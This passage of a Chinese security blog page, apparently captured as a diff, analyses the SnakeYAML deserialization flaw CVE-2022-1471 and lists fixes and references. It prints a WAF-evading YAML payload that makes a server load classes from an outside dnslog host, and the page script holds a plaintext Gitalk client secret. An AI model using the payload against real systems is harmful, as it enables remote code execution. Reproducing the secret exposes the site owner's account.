+<p>实现TagInspector接口，此处直接返回true，也可以在isGlobalTagAllowed方法中根据tag来进行逻辑判断决定允许哪些类能被反序列化。</p>
+<p><img src="/archives/f98d45ce/image-20230814194330452.png" alt="image-20230814194330452"></p>
+<p>重写isGlobalTagAllowed方法后的结果</p>
+<p><img src="/archives/f98d45ce/image-20230814194609615.png" alt="image-20230814194609615"></p>
+<p>远程类加载</p>
+<p><img src="/archives/f98d45ce/image-20230814194851114.png" alt="image-20230814194851114"></p>
+<p>在分析的过程中我发现了一些好玩的地方，手下时除了load方法可以利用该payload外，如果我们使用的时loadAs方法被人制定了目标类的类型应该怎么办？</p>
+<p>当然如果类型不匹配，即ScriptEngineFactory如果不是目标类的子类或这实现类，就没得玩，但是如果是一些抽象级别比较高的类还是大有可为的，比如xxxx组件就是这么干的，嗯一个CVE到手了。</p>
+<p>两外我们可以利用Yaml语法中的TAG特性来实现WAF绕过，我们只需要对payload进行以下的变形</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">%TAG</span> <span class="type">!m</span><span class="string">!</span> <span class="string">tag:yaml.org,2002:java</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="type">!m!x.script.ScriptEngineManager</span> [<span class="type">!m!.net.URLClassLoader</span> [[<span class="type">!m!.net.URL</span> [<span class="string">&quot;http://i0hrz1.dnslog.cn&quot;</span>]]]]</span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure>
+
+<p>依旧RCE，还可以用来绕WAF</p>
+<p><img src="/archives/f98d45ce/image-20230814195046711.png" alt="image-20230814195046711"></p>
+<h2 id="修复措施"><a href="#修复措施" class="headerlink" title="修复措施"></a>修复措施</h2><ol>
+<li>升级软件到不受影响的版本或最新版，最新版maven仓库地址：<a target="_blank" rel="noopener external nofollow noreferrer" href="https://mvnrepository.com/artifact/org.yaml/snakeyaml/2.1%E3%80%82">https://mvnrepository.com/artifact/org.yaml/snakeyaml/2.1。</a></li>
+<li>限制服务器出网</li>
+</ol>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><a target="_blank" rel="noopener external nofollow noreferrer" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1471">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1471</a></li>
+<li><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2022-1471">https://www.cvedetails.com/cve-details.php?t=1&amp;cve_id=CVE-2022-1471</a></li>
+<li><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2022-1471">https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2022-1471</a></li>
+<li><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.cnblogs.com/nice0e3/p/14514882.html">https://www.cnblogs.com/nice0e3/p/14514882.html</a></li>
+<li><a target="_blank" rel="noopener external nofollow noreferrer" href="https://y4tacker.github.io/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/">https://y4tacker.github.io/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/</a></li>
+<li><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.cnblogs.com/R0ser1/p/16213257.html">https://www.cnblogs.com/R0ser1/p/16213257.html</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    <div class="post-widgets">
+      <div id="needsharebutton-postbottom">
+        <span class="btn">
+          <i class="fa fa-share-alt" aria-hidden="true"></i>
+        </span>
+      </div>
+    </div>
+        <div class="reward-container">
+  <div>Buy me a coffee.</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.png" alt="Arliya 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="Arliya 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Arliya
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://dayutech.github.io/archives/f98d45ce.html" title="SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471）">https://dayutech.github.io/archives/f98d45ce.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener external nofollow noreferrer" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/RCE/" rel="tag"><i class="fa fa-tag"></i> RCE</a>
+              <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"><i class="fa fa-tag"></i> 反序列化</a>
+              <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag"><i class="fa fa-tag"></i> 网络安全</a>
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag"><i class="fa fa-tag"></i> 漏洞分析</a>
+              <a href="/tags/%E6%BC%8F%E6%B4%9E/" rel="tag"><i class="fa fa-tag"></i> 漏洞</a>
+              <a href="/tags/SnakeYaml/" rel="tag"><i class="fa fa-tag"></i> SnakeYaml</a>
+              <a href="/tags/CVE-2022-1471/" rel="tag"><i class="fa fa-tag"></i> CVE-2022-1471</a>
+          </div>
+		  
+          <script data-pjax>
+	var tagsall=document.getElementsByClassName("post-tags")
+	for (var i = tagsall.length - 1; i >= 0; i--){
+		var tags=tagsall[i].getElementsByTagName("a");
+		for (var j = tags.length - 1; j >= 0; j--) {
+			var golden_ratio = 0.618033988749895;
+			var s = 0.5;
+			var v = 0.999;
+			var h = golden_ratio + Math.random()*0.8 - 0.5;
+			var h_i = parseInt(h * 6);
+			var f = h * 6 - h_i;
+			var p = v * (1 - s);
+			var q = v * (1 - f * s);
+			var t = v * (1 - (1 - f) * s);
+			var r, g, b;
+			switch (h_i) {
+				case 0:
+					r = v;
+					g = t;
+					b = p;
+					break;
+				case 1:
+					r = q;
+					g = v;
+					b = p;
+					break;
+				case 2:
+					r = p;
+					g = v;
+					b = t;
+					break;
+				case 3 :
+					r = p;
+					g = q;
+					b = v;
+					break;
+				case 4:
+					r = t;
+					g = p;
+					b = v;
+					break;
+				case 5:
+					r = v;
+					g = p;
+					b = q;
+					break;
+				default:
+					r = 1;
+					g = 1;
+					b = 1;
+			  }
+			tags[j].style.background = "rgba("+parseInt(r*255)+","+parseInt(g*255)+","+parseInt(b*255)+","+0.5+")";
+		}
+	}          
+                         
+            </script>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/archives/6725ab5c.html" rel="prev" title="Spring Kafka 消息头反序列化漏洞（CVE-2023-34040）">
+      <i class="fa fa-chevron-left"></i> Spring Kafka 消息头反序列化漏洞（CVE-2023-34040）
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/archives/b5364c9e.html" rel="next" title="JAVA生态常见架构介绍、配置与逻辑定位方法">
+      JAVA生态常见架构介绍、配置与逻辑定位方法 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  <!-- needsharebutton Javascript file -->
+<script src="js/needsharebutton.min.js"></script>
+<!-- needsharebutton CSS file -->
+<link href="css/needsharebutton.min.css" rel="stylesheet" />
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%EF%BC%88CVE-2022-1471%EF%BC%89"><span class="nav-number">1.</span> <span class="nav-text">SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%A7%E5%93%81%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.1.</span> <span class="nav-text">产品介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%97%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="nav-number">1.3.</span> <span class="nav-text">受影响版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">1.4.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83"><span class="nav-number">1.4.1.</span> <span class="nav-text">调试环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.4.2.</span> <span class="nav-text">漏洞原理</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D%E6%8E%AA%E6%96%BD"><span class="nav-number">1.5.</span> <span class="nav-text">修复措施</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">1.6.</span> <span class="nav-text">参考链接</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Arliya"
+      src="/images/dayu/avatar.png">
+  <p class="site-author-name" itemprop="name">Arliya</p>
+  <div class="site-description" itemprop="description">主要从事Web漏洞挖掘工作，涉猎编程语言包括Java、Scala、C/C++、PHP、Python、C#、Golang，涉及领域包括Web以及二进制漏洞挖掘，二进制比较菜，平时喜欢在金融市场消费</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">101</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">27</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">190</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/dayutech" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;dayutech" rel="noopener external nofollow noreferrer" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:test@qq.com" title="E-Mail → mailto:test@qq.com" rel="noopener external nofollow noreferrer" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/yourname" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;yourname" rel="noopener external nofollow noreferrer" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://youtube.com/yourname" title="YouTube → https:&#x2F;&#x2F;youtube.com&#x2F;yourname" rel="noopener external nofollow noreferrer" target="_blank"><i class="fab fa-youtube fa-fw"></i>YouTube</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener external nofollow noreferrer" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+	  
+		<div class="links-of-blogroll scroll" style="margin-top:20px; border-style:dotted none none none; padding-top:5px; text-align:left;padding-left: 20px; padding-right: 10px; padding-bottom: 5px;">
+		  <div class="links-of-blogroll-title" style="padding-bottom: 5px; padding-top: 5px; padding-left: 0px; padding-right: 20px; font-size: 1.6em; argin-right: 5px;">
+		<!-- 选择合适的icon --><i class="fab fa-markdown" aria-hidden="true"></i>
+			<b style="font-size: 0.65em; padding-left: 8px; position: relative; top: -2px;">文章列表</b>
+		  </div>
+		  <ul class="links-of-blogroll-list">
+		<!-- 文章排序规格,-updated 按照文章更新时间倒排 -->
+			
+		<!-- 显示10数目的文章 -->
+			
+			  <li class="postsSidebarNumb" style="text-indent: -1em;">
+				<a href="/archives/42eb2c82.html" title="动态代理在java反序列化中的应用" target="_blank">动态代理在java反序列化中的应用</a>
+			  </li>
+			
+			  <li class="postsSidebarNumb" style="text-indent: -1em;">
+				<a href="/archives/b7f3ad9b.html" title="面试题整理" target="_blank">面试题整理</a>
+			  </li>
+			
+			  <li class="postsSidebarNumb" style="text-indent: -1em;">
+				<a href="/archives/9c75190f.html" title="防火墙" target="_blank">防火墙</a>
+			  </li>
+			
+			  <li class="postsSidebarNumb" style="text-indent: -1em;">
+				<a href="/archives/42623881.html" title="通过Tomcat BeanFactory 绕过高版本JDK CodeBase限制实现JNDI注入" target="_blank">通过Tomcat BeanFactory 绕过高版本JDK CodeBase限制实现JNDI注入</a>
+			  </li>
+			
+			  <li class="postsSidebarNumb" style="text-indent: -1em;">
+				<a href="/archives/6eecc4bb.html" title="读书笔记-WEB前端黑客技术揭秘" target="_blank">读书笔记-WEB前端黑客技术揭秘</a>
+			  </li>
+			
+			  <li class="postsSidebarNumb" style="text-indent: -1em;">
+				<a href="/archives/ef2b93c5.html" title="记一次Pyppeteer调试解决--Browser closed unexpectedly--的问题" target="_blank">记一次Pyppeteer调试解决--Browser closed unexpectedly--的问题</a>
+			  </li>
+			
+			  <li class="postsSidebarNumb" style="text-indent: -1em;">
+				<a href="/archives/53e2963.html" title="解决hexo图片访问遇到图床防盗链无法访问的问题" target="_blank">解决hexo图片访问遇到图床防盗链无法访问的问题</a>
+			  </li>
+			
+			  <li class="postsSidebarNumb" style="text-indent: -1em;">
+				<a href="/archives/7f771bb5.html" title="解决hexo内嵌js无法加载问题" target="_blank">解决hexo内嵌js无法加载问题</a>
+			  </li>
+			
+			  <li class="postsSidebarNumb" style="text-indent: -1em;">
+				<a href="/archives/e9ccef3c.html" title="解决hexo-pdf无法使用的问题" target="_blank">解决hexo-pdf无法使用的问题</a>
+			  </li>
+			
+			  <li class="postsSidebarNumb" style="text-indent: -1em;">
+				<a href="/archives/cf1ba47f.html" title="解决hexo-next主题上游仓库改变告警" target="_blank">解决hexo-next主题上游仓库改变告警</a>
+			  </li>
+			
+		  </ul>
+		</div>
+	  
+	 
+    </div>
+	
+  </aside>
+  <div id="sidebar-dimmer"></div>
+ 
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Arliya</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">202k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">12:14</span>
+</div>
+  <div class="powered-by">由 <a href="https://github.com/dayutech" class="theme-link" rel="noopener external nofollow noreferrer" target="_blank">DayuTech</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+<div id="needsharebutton-float">
+      <span class="btn">
+        <i class="fa fa-share-alt" aria-hidden="true"></i>
+      </span>
+    </div>
+  <script src="//cdn.jsdelivr.net/gh/theme-next/theme-next-needmoreshare2@1/needsharebutton.min.js"></script>
+  <script>
+      pbOptions = {};
+        pbOptions.iconStyle = "box";
+        pbOptions.boxForm = "horizontal";
+        pbOptions.position = "bottomCenter";
+        pbOptions.networks = "Wechat,QQZone,Weibo,Douban,Twitter,Facebook";
+      new needShareButton('#needsharebutton-postbottom', pbOptions);
+      flOptions = {};
+        flOptions.iconStyle = "box";
+        flOptions.boxForm = "horizontal";
+        flOptions.position = "middleRight";
+        flOptions.networks = "Wechat,QQZone,Weibo,Douban,Twitter,Facebook";
+      new needShareButton('#needsharebutton-float', flOptions);
+  </script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : 'Ov23li28mRRYx9D76aAJ',
+      clientSecret: '8f7211d1bd039050ed40345ddf60273d6626ad6f',
+      repo        : 'dayutech.github.io',
+      owner       : 'dayutech',
+      admin       : ['dayutech'],
+      id          : '95ad8e49d73a6b95e68fd28dca4aa445',
+        language: 'zh-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+<style>
+#custom_bar {
+  float: right;
+  font-style: italic;
+  background-color: lightgray;
+  position: fixed;
+  top: 20%;
+  right: 50px;
+  box-shadow: 15px 10px 10px gray;
+}
+/* 新年侧边栏 */
+#newYear {
+  color: white;
+  padding: 0 !important;
+}
+
+#newYear p,
+#newYear h3 {
+  font-weight: normal;
+  color: inherit;
+  margin: 0;
+}
+
+#newYear .item-headline {
+  display: none;
+}
+
+.newYear-slider {
+  position: absolute;
+  left: 0;
+  top: 0;
+  height: 100%;
+  width: 100%;
+}
+
+.newYear-slider .swiper-slide {
+  min-height: 160px;
+  min-width: 210px;
+  background-size: cover;
+  position: absolute;
+  left: 0;
+  top: 0;
+  height: 100%;
+  width: 100%;
+}
+
+#newYear-main {
+  width: 100%;
+  pointer-events: none;
+  padding: 1rem;
+  position: relative;
+  left: 0;
+  top: 0;
+  z-index: 1;
+}
+
+#newYear-main * {
+  position: relative;
+  line-height: 1.3;
+}
+
+#newYear-main .time,
+#newYear-main .happyNewYear {
+  font-size: 3rem;
+  margin: 8px 0;
+  display: block;
+}
+
+#newYear-main .newYear-time {
+  font-weight: bold;
+  text-align: center;
+}
+
+#newYear-main .day {
+  font-size: 4rem;
+  letter-spacing: 6px;
+  margin-right: -6px;
+}
+
+#newYear-main .unit {
+  font-size: 1rem;
+}
+
+#newYear-main .mask {
+  position: absolute;
+  left: 0;
+  top: 0;
+  height: 100%;
+  width: 100%;
+  background-color: rgba(0, 0, 0, .2);
+}
+
+[data-theme=dark] #newYear-main .mask {
+  background-color: rgba(0, 0, 0, .3);
+}
+</style>
+<link data-pjax rel="stylesheet" href="https://lf9-cdn-tos.bytecdntp.com/cdn/expire-1-M/Swiper/8.0.6/swiper-bundle.min.css">
+<aside id="custom_bar">
+    <div id="newYear">
+        <div class="newYear-slider">
+            <div class="swiper-wrapper">
+                <div class="swiper-slide" style="background-image:url(/images/ma1.jpg)"></div>
+                <div class="swiper-slide" style="background-image:url(/images/ma2.jpg)"></div>
+                <div class="swiper-slide" style="background-image:url(/images/ma3.jpg)"></div>
+                <div class="swiper-slide" style="background-image:url(/images/ma4.jpg)"></div>
+            </div>
+        </div>
+        <div id="newYear-main">
+            <div class="mask"></div>
+            <p class="title"></p>
+            <div class="newYear-time"></div>
+            <p class="today" style="text-align: right;"></p>
+        </div>
+    </div>
+</aside>
+<script data-pjax src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/Swiper/8.0.6/swiper-bundle.min.js"></script>
+<script data-pjax>
+    function newYear() {
+    if (!document.querySelector('#newYear')) return;
+    // 新年时间戳 and 星期对象
+    let SpringFestival = new Date('2026-02-17 00:00:00')
+    let newYear = SpringFestival.getTime() / 1000,
+        week = { 0: '周日', 1: '周一', 2: '周二', 3: '周三', 4: '周四', 5: '周五', 6: '周六' }
+    function nol(h) { h = Number(h); return h > 9 ? h : '0' + h; }
+    time();
+
+    function time() {
+        // 现在 时间对象
+        let now = new Date();
+
+        // 右下角 今天
+        document.querySelector('#newYear .today').innerHTML = now.getFullYear() + '-' + (now.getMonth() + 1) + '-' + now.getDate() + ' ' + week[now.getDay()]
+
+        // 现在与新年相差秒数
+        let second = newYear - Math.round(now.getTime() / 1000);
+
+        // 小于0则表示已经过年
+        if (second < 0) {
+        window.newYearTimer = null
+        document.querySelector('#newYear .title').innerHTML = 'Happy New Year!';
+        document.querySelector('#newYear .newYear-time').innerHTML = '<span class="happyNewYear">新年快乐</span>';
+        } else {
+        // 大于0则还未过年
+        document.querySelector('#newYear .title').innerHTML = '距离' + SpringFestival.getFullYear() + '年春节：'
+        // 大于一天则直接渲染天数
+        if (second > 86400) {
+            document.querySelector('#newYear .newYear-time').innerHTML = `<span class="day">${Math.ceil(second / 86400)}</span><span class="unit">天</span>`
+        } else {
+            // 小于一天则使用时分秒计时。
+            let h = nol(parseInt(second / 3600));
+            second %= 3600;
+            let m = nol(parseInt(second / 60));
+            second %= 60;
+            let s = nol(second);
+            document.querySelector('#newYear .newYear-time').innerHTML = `<span class="time">${h}:${m}:${s}</span></span>`;
+            // 计时
+            if (!window.newYearTimer) window.newYearTimer = setInterval(time, 1000);
+        }
+        }
+    }
+    }
+
+    function newYearSwiper() {
+    var swiper = new Swiper('.newYear-slider', {
+        passiveListeners: true,
+        loop: true,
+        // autoplay: false,
+        autoplay: {
+        disableOnInteraction: true,
+        delay: 5000
+        },
+        effect: 'fade',
+        mousewheel: true,
+        autoHeight: true
+    });
+
+    var comtainer = document.querySelector('.newYear-slider');
+    if (comtainer !== null) {
+        comtainer.onmouseenter = () => { swiper.autoplay.stop() };
+        comtainer.onmouseleave = () => { swiper.autoplay.start() };
+    }
+    }
+
+    // 适配了pjax
+    function whenDOMReady() {
+    // pjax加载完成（切换页面）后需要执行的函数和代码
+    newYear()
+    newYearSwiper()
+    }
+
+    whenDOMReady() // 打开网站先执行一次
+    document.addEventListener("pjax:complete", whenDOMReady) // pjax加载完成（切换页面）后再执行一次
+</script>
+
+    </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
